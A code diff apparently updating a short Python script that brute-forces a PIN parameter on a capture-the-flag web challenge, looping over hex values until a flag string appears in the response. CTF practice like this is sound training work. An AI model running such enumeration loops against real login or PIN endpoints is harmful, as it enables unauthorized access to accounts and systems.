@@ -1,14 +1,20 @@
-import urllib2
+from urllib.request import urlopen
 import re
 
-for x in range(0, 99999):
-    url = "https://ctf.sucurihc.org/flag/eua/web50/?pin="+str(x)
-    #conteudo = urllib2.url_open(url)
+def progress(count, total):
+    return (count/total)*100
 
-    print "[DEBUG] >>> Opening URL %s" % url
-    conteudo = urllib2.urlopen(url).read()
-    result = re.findall("<center>(.*?)</center>", conteudo)
+for x in range(0, 999):
+    url = "https://ctf.sucurihc.org/flag/eua/web50/?pin="+str(hex(x)[2:])
 
-    if "SHC{" in result:
+    print("[DEBUG] >>> Opening URL {}".format(url))
+    print("{0:.2f}%".format(progress(x, 999)))
+    conteudo = urlopen(url).read().decode('utf-8')
+    #print(conteudo)
+    
+    result = re.findall("<center>(.*?)</center>", conteudo)[0]
+    print(result)
 
-        print "[DEBUG] >>> Flag: %s" % result
+    if 'SHC{' in result:
+        break
+
